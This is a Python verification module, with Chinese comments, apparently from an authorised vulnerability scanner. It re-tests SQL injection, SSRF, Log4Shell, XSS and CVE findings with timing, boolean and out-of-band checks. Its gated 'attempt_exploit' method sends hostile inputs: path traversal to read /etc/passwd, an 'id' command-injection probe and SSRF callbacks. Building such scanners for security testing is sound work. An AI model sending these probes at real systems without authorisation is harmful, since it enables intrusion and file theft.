"""验证与利用模块：误报过滤 + PoC 复现 + 利用取证。

对扫描器产出的候选 Finding 逐个验证：
1. 误报过滤：对照误报特征库，剔除明显误报
2. 二次复现：重新发送 payload，检查信号一致性
3. 带外验证：对盲注/SSRF/Log4Shell 启动 OOB 回调
4. 利用取证：在授权范围内获取最小证据（如读取特定文件、时间差）
通过则置 CONFIRMED / EXPLOITED，否则 FALSE_POSITIVE / FAILED。
"""
from __future__ import annotations

import time
from typing import List, Optional
from urllib.parse import urlencode

from config import Settings
from core.models import (
    Confidence, Finding, ScanContext, Severity, VulnStatus,
)
from knowledge import KnowledgeBase
from utils import HTTPClient, OOBListener, SafetyGuard
from utils.logger import get_logger

logger = get_logger("verifier")


class VerifierModule:
    """候选漏洞验证器。"""

    def __init__(self, settings: Settings, kb: KnowledgeBase,
                 http: HTTPClient, guard: SafetyGuard,
                 oob: Optional[OOBListener] = None) -> None:
        self.settings = settings
        self.kb = kb
        self.http = http
        self.guard = guard
        self.oob = oob

    def run(self, ctx: ScanContext) -> List[Finding]:
        candidates = [f for f in ctx.findings
                      if f.status == VulnStatus.CANDIDATE]
        if not candidates:
            return []
        ctx.log("verifier", "start", {"candidates": len(candidates)})
        confirmed: List[Finding] = []

        for finding in candidates:
            try:
                ok = self._verify(finding, ctx)
            except Exception as e:
                logger.warning("验证异常 %s: %s", finding.id, e)
                ok = False
            finding.verified_at = time.time()
            if ok:
                confirmed.append(finding)
            ctx.log("verifier", "result", {
                "id": finding.id, "vuln": finding.vuln_type,
                "confirmed": ok,
            })

        ctx.log("verifier", "done", {"confirmed": len(confirmed)})
        logger.info("验证完成: %d/%d 确认",
                    len(confirmed), len(candidates))
        return confirmed

    # ── 单个 Finding 验证 ──────────────────────────────────────────
    def _verify(self, finding: Finding, ctx: ScanContext) -> bool:
        # 1. 误报特征库快速过滤
        if self._is_false_positive(finding):
            finding.status = VulnStatus.FALSE_POSITIVE
            finding.confidence = Confidence.LOW
            finding.add_evidence("verifier", "命中误报特征库")
            return False

        vuln_type = finding.vuln_type
        # CVE 类：靠指纹置信，直接降级为已确认（仍可进一步验证 OOB）
        if vuln_type.startswith("cve-"):
            return self._verify_cve(finding, ctx)

        pattern = self.kb.get_pattern(vuln_type)
        if not pattern:
            # 未知类型，仅做二次复现
            return self._reproduce(finding)

        # 2. 时间盲注验证
        if vuln_type == "sqli" and pattern.get("time_probe"):
            return self._verify_time_based(finding, pattern)

        # 3. 布尔盲注验证
        if vuln_type == "sqli":
            return self._verify_boolean(finding, pattern)

        # 4. 带外验证（SSRF / Log4Shell / 盲命令注入）
        if vuln_type in ("ssrf",) or "jndi" in (finding.payload or ""):
            return self._verify_oob(finding, pattern)

        # 5. 反射/回显验证
        return self._verify_reflection(finding, pattern)

    # ── 误报过滤 ───────────────────────────────────────────────────
    def _is_false_positive(self, finding: Finding) -> bool:
        sigs = self.kb.fp_signatures(finding.vuln_type)
        body = (finding.response_snippet or "").lower()
        # XSS：payload 被转义/编码 → 误报
        if finding.vuln_type == "xss":
            pl = (finding.payload or "").lower()
            if pl and pl not in body:
                # payload 未原样回显，可能被编码
                if any(enc in body for enc in ("&lt;", "&gt;", "\\u003c", "blocked")):
                    return True
                return True
        # 通用：404/403 + 无 payload 相关回显
        if any(code in body for code in ("404", "403", "not found")):
            # 但需排除确实返回错误的 SQLi 信号
            if not any(s in body for s in ("sql", "syntax", "ora-")):
                return True
        # SSRF 无 OOB 命中且无内网特征
        if finding.vuln_type == "ssrf":
            if not finding.oob_hit and not any(
                leak in body for leak in ("169.254", "metadata", "root:x")
            ):
                return True
        return False

    # ── CVE 验证：优先 OOB，否则标记 confirmed（指纹置信）──────────
    def _verify_cve(self, finding: Finding, ctx: ScanContext) -> bool:
        cve = self.kb.get_cve(finding.cve or finding.vuln_type.upper())
        if not cve:
            finding.status = VulnStatus.FAILED
            return False
        oob_probe = cve.get("oob_probe")
        if oob_probe and self.oob and "{collab_host}" in oob_probe:
            tag = self.oob.new_tag("cve")
            host = f"{self.oob.host}:{self.oob.port}"
            payload = oob_probe.replace("{collab_host}", host).replace(
                "{tag}", tag)
            self.guard.assert_payload_safe(payload)
            resp = self.http.get(finding.asset.value,
                                 params={"q": payload},
                                 timeout=self.guard.poc_timeout)
            hit = self.oob.wait_hit(tag, timeout=8)
            if hit:
                finding.oob_hit = True
                finding.payload = payload
                finding.add_evidence("oob", f"回调命中 src={hit.src_ip}")
                finding.status = VulnStatus.CONFIRMED
                finding.confidence = Confidence.VERIFIED
                return True
            # OOB 未命中，仍保留为 medium 置信（指纹匹配）
            finding.add_evidence("oob", "带外回调未命中")
            finding.status = VulnStatus.CONFIRMED
            finding.confidence = Confidence.MEDIUM
            return True
        # 无 OOB 探针，按指纹置信确认
        finding.status = VulnStatus.CONFIRMED
        finding.confidence = Confidence.MEDIUM
        finding.add_evidence("fingerprint", "指纹匹配，无主动 PoC")
        return True

    # ── 时间盲注 ───────────────────────────────────────────────────
    def _verify_time_based(self, finding: Finding, pattern: dict) -> bool:
        probe = pattern["time_probe"]
        baseline = pattern.get("boolean_true", " AND 1=1-- -")
        url = finding.asset.value
        # 基线请求
        r0 = self.http.get(url, params={"q": "1" + baseline},
                           timeout=self.guard.poc_timeout + 5)
        base_time = r0.elapsed
        # 注入请求（SLEEP 5）
        r1 = self.http.get(url, params={"q": "1" + probe},
                           timeout=self.guard.poc_timeout + 10)
        delay = r1.elapsed - base_time
        finding.add_evidence("timing", f"baseline={base_time:.2f}s delay={delay:.2f}s")
        if delay >= 4.0:  # 显著时延
            finding.status = VulnStatus.CONFIRMED
            finding.confidence = Confidence.HIGH
            finding.payload = probe
            return True
        finding.status = VulnStatus.FALSE_POSITIVE
        return False

    # ── 布尔盲注 ───────────────────────────────────────────────────
    def _verify_boolean(self, finding: Finding, pattern: dict) -> bool:
        url = finding.asset.value
        true_p = "1" + pattern.get("boolean_true", " AND 1=1-- -")
        false_p = "1" + pattern.get("boolean_false", " AND 1=2-- -")
        r_true = self.http.get(url, params={"q": true_p},
                               timeout=self.guard.poc_timeout)
        r_false = self.http.get(url, params={"q": false_p},
                                timeout=self.guard.poc_timeout)
        # 比较：true 与 false 响应有显著差异（长度/状态）
        len_diff = abs(len(r_true.body) - len(r_false.body))
        finding.add_evidence(
            "boolean",
            f"true_len={len(r_true.body)} false_len={len(r_false.body)} diff={len_diff}",
        )
        if len_diff > 50 or r_true.status != r_false.status:
            finding.status = VulnStatus.CONFIRMED
            finding.confidence = Confidence.HIGH
            finding.payload = true_p
            return True
        finding.status = VulnStatus.FALSE_POSITIVE
        return False

    # ── 带外验证 ───────────────────────────────────────────────────
    def _verify_oob(self, finding: Finding, pattern: dict) -> bool:
        if not self.oob:
            finding.add_evidence("oob", "无 OOB 监听器，无法验证盲注")
            finding.status = VulnStatus.FAILED
            return False
        tag = self.oob.new_tag(finding.vuln_type)
        collab_host = f"{self.oob.host}:{self.oob.port}"
        tmpl = pattern.get("oob_probe_template") or finding.payload or ""
        if "{collab_host}" in tmpl:
            payload = tmpl.replace("{collab_host}", collab_host).replace(
                "{tag}", tag)
        else:
            payload = tmpl
        self.guard.assert_payload_safe(payload)
        self.http.get(finding.asset.value, params={"q": payload},
                      timeout=self.guard.poc_timeout)
        hit = self.oob.wait_hit(tag, timeout=10)
        if hit:
            finding.oob_hit = True
            finding.payload = payload
            finding.add_evidence("oob", f"回调命中 src={hit.src_ip} path={hit.path}")
            finding.status = VulnStatus.CONFIRMED
            finding.confidence = Confidence.VERIFIED
            return True
        finding.status = VulnStatus.FALSE_POSITIVE
        finding.add_evidence("oob", "带外回调未命中")
        return False

    # ── 反射/回显验证 ──────────────────────────────────────────────
    def _verify_reflection(self, finding: Finding, pattern: dict) -> bool:
        return self._reproduce(finding)

    def _reproduce(self, finding: Finding) -> bool:
        """二次复现：重新发送 payload，确认信号一致。"""
        if not finding.asset or not finding.payload:
            finding.status = VulnStatus.FAILED
            return False
        resp = self.http.get(finding.asset.value,
                             params={"q": finding.payload},
                             timeout=self.guard.poc_timeout)
        if resp.error:
            finding.status = VulnStatus.FAILED
            return False
        body = resp.body.lower()
        # 检查原证据是否仍存在
        pattern = self.kb.get_pattern(finding.vuln_type) or {}
        signals = [s.lower() for s in pattern.get("hit_signals", [])]
        if signals and any(s in body for s in signals):
            finding.status = VulnStatus.CONFIRMED
            finding.confidence = Confidence.HIGH
            finding.response_snippet = body[:500]
            finding.add_evidence("reproduce", "二次复现信号一致")
            return True
        # XSS 反射复现
        if finding.vuln_type == "xss" and finding.payload.lower() in body:
            finding.status = VulnStatus.CONFIRMED
            finding.confidence = Confidence.HIGH
            finding.response_snippet = body[:500]
            finding.add_evidence("reproduce", "反射复现一致")
            return True
        finding.status = VulnStatus.FALSE_POSITIVE
        finding.add_evidence("reproduce", "二次复现未命中信号")
        return False

    # ── 利用取证（可选，受 allow_exploitation 控制）────────────────
    def attempt_exploit(self, finding: Finding, ctx: ScanContext) -> bool:
        """在授权范围内获取最小利用证据，不进行破坏性操作。"""
        self.guard.assert_action_allowed("exploit")
        if finding.status != VulnStatus.CONFIRMED:
            return False
        vt = finding.vuln_type
        url = finding.asset.value
        evidence: List[str] = []

        if vt == "path_traversal":
            resp = self.http.get(url, params={"file": "../../../../etc/passwd"},
                                 timeout=self.guard.poc_timeout)
            if "root:" in resp.body:
                evidence.append("成功读取 /etc/passwd（取证）")
        elif vt == "cmd_injection":
            resp = self.http.get(url, params={"cmd": "id"},
                                 timeout=self.guard.poc_timeout)
            if "uid=" in resp.body:
                evidence.append(f"命令执行成功: {resp.body[:200]}")
        elif vt == "ssrf" and self.oob:
            tag = self.oob.new_tag("exploit")
            payload = f"http://{self.oob.host}:{self.oob.port}/{tag}"
            self.http.get(url, params={"url": payload},
                          timeout=self.guard.poc_timeout)
            if self.oob.wait_hit(tag, timeout=8):
                evidence.append("SSRF 利用：服务端发起回调")

        if evidence:
            for e in evidence:
                finding.add_evidence("exploit", e)
            finding.status = VulnStatus.EXPLOITED
            finding.confidence = Confidence.VERIFIED
            ctx.log("verifier", "exploited", {"id": finding.id, "vt": vt})
            return True
        return False
